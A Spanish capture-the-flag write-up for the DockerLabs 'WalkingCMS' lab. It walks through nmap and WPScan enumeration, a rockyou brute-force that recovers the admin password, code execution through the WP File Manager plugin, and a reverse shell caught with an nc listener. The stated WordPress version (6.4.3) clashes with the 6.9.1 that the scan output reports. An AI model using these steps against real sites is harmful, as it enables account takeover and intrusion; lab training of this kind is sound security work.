![](adjuntos/Pasted%20image%2020260217054052.png)

# WalkingCMS – DockerLabs

> Explotación práctica de una instancia mal configurada de WordPress que conduce a acceso administrativo autenticado y ejecución remota de código (RCE) dentro de un entorno contenerizado.

---

## 1️⃣ Lab Information

- **Plataforma:** [DockerLabs](https://dockerlabs.es)
- **Tipo de entorno:** Contenedor Docker
- **Servicio objetivo:** WordPress 6.4.3 (Apache 2.4.57 – Debian)
- **Vulnerabilidad explotada:** Credenciales débiles + abuso de privilegios administrativos que permiten ejecución de código PHP (RCE)
- **Dificultad:** Media

### Habilidades demostradas

- Enumeración (Nmap)
- Reconocimiento de aplicaciones web
- Enumeración de usuarios (WPScan)
- Ataque de fuerza bruta controlado
- Ejecución remota de código (RCE)
- Gestión de Reverse Shell

## 🐳 2️⃣ Despliegue

La máquina se despliega como contenedor mediante el script proporcionado:

```bash
sudo bash auto_deploy.sh walkingcms.tar
[+] Image loaded successfully 
[+] Container started 
[+] Assigned IP: 172.17.0.2
```

## 🔎 3️⃣ Enumeración

```bash
sudo nmap -p- -sS -sC -sV --min-rate 5000 -n -Pn 172.17.0.2 

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache 2.4.57 (Debian)
```
## 4️⃣ Análisis del servicio

El puerto **80/tcp** expone un servidor Apache 2.4.57 (Debian).

Acceso inicial:
```bash
http://172.17.0.2
```

Se observa la página por defecto de Apache.

Durante la enumeración manual se identifica un subdirectorio activo:

```bash
http://172.17.0.2/wordpress
```


Se confirma la presencia de WordPress 6.4.3.

📌 Servicio de alto impacto identificado. Se prioriza explotación a nivel aplicación web.


## 5️⃣ Identificación y preparación del ataque

### 5.1 Enumeración de usuarios

Enumeración automática del CMS:
```bash
wpscan --url http://172.17.0.2/wordpress -e u
```

Salida relevante:
```bash
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://172.17.0.2/wordpress/ [172.17.0.2]
[+] Started: Tue Feb 17 06:30:40 2026

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.57 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://172.17.0.2/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://172.17.0.2/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://172.17.0.2/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://172.17.0.2/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.9.1 identified (Latest, released on 2026-02-03).
 | Found By: Rss Generator (Passive Detection)
 |  - http://172.17.0.2/wordpress/index.php/feed/, <generator>https://wordpress.org/?v=6.9.1</generator>
 |  - http://172.17.0.2/wordpress/index.php/comments/feed/, <generator>https://wordpress.org/?v=6.9.1</generator>

[+] WordPress theme in use: twentytwentytwo
 | Location: http://172.17.0.2/wordpress/wp-content/themes/twentytwentytwo/
 | Last Updated: 2025-12-03T00:00:00.000Z
 | Readme: http://172.17.0.2/wordpress/wp-content/themes/twentytwentytwo/readme.txt
 | [!] The version is out of date, the latest version is 2.1
 | Style URL: http://172.17.0.2/wordpress/wp-content/themes/twentytwentytwo/style.css?ver=1.6
 | Style Name: Twenty Twenty-Two
 | Style URI: https://wordpress.org/themes/twentytwentytwo/
 | Description: Built on a solidly designed foundation, Twenty Twenty-Two embraces the idea that everyone deserves a...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.6 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://172.17.0.2/wordpress/wp-content/themes/twentytwentytwo/style.css?ver=1.6, Match: 'Version: 1.6'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <==================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] mario
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://172.17.0.2/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Tue Feb 17 06:30:42 2026
[+] Requests Done: 53
[+] Cached Requests: 6
[+] Data Sent: 14.14 KB
[+] Data Received: 332.674 KB
[+] Memory used: 179.184 MB
[+] Elapsed time: 00:00:01
```

Se confirma la existencia del usuario `mario`.

### 5.2 Ataque de fuerza bruta

Descompresión del diccionario (si aplica):
```bash
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
```


Ejecución del ataque dirigido:
```bash
wpscan --url http://172.17.0.2/wordpress -U mario -P /usr/share/wordlists/rockyou.txt
```

Se obtienen credenciales válidas del panel administrativo.

```bash
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://172.17.0.2/wordpress/ [172.17.0.2]
[+] Started: Tue Feb 17 06:31:57 2026

[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - mario / love                                                                                                                        
Trying mario / dakota Time: 00:00:17 <  > (390 / 14344782)  0.00%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: mario, Password: love
```

📌 Acceso autenticado como administrador de WordPress.

## 6️⃣ Explotación

Acceso al panel administrativo de WordPress:

```bash
http://172.17.0.2/wordpress/wp-admin
```

Tras autenticación exitosa con las credenciales obtenidas, se procede a la instalación de un plugin que permita interacción directa con el sistema de archivos.

Instalación del plugin:

`Plugins → Añadir nuevo → WP File Manager`

Una vez activado, el plugin permite:

- Navegación completa del árbol de directorios.
- Edición de archivos PHP.
- Escritura arbitraria dentro del entorno web.

Se modifica un archivo PHP existente e inserta código de reverse shell para lograr ejecución remota.
### Preparación del listener en la máquina atacante

Antes de ejecutar el archivo modificado, se prepara un listener para recibir la conexión entrante:

```bash
sudo nc -lvnp 443
```

Salida esperada:
```bash
Listening on 0.0.0.0 443
```

El listener debe permanecer activo antes de invocar el archivo PHP alterado desde el navegador.

Ejecución del archivo modificado desde navegador.

## 7️⃣ Validación de acceso

Conexión recibida en la máquina atacante:

```bash
sudo nc -lvnp 443

[sudo] contraseña para lolo:
Listening on 0.0.0.0 443
Connection received on 172.17.0.2 53112
Linux 08e7c09799a6 6.12.32-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.32-1parrot1 (2025-06-27) x86_64 GNU/Linux
 04:23:47 up  2:58,  0 user,  load average: 1.29, 0.80, 0.68
uid=33(www-data) gid=33(www-data) groups=33(www-data)
sh: 0: can't access tty; job control turned off
$
```

Validación:
```bash
whoami
```
Respuesta:
```bash
www-data
```

Se obtiene shell interactiva como usuario del servicio web.

## 🔐 Validación de privilegios
```bash
id uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
Se confirma ejecución de comandos bajo el usuario `www-data`.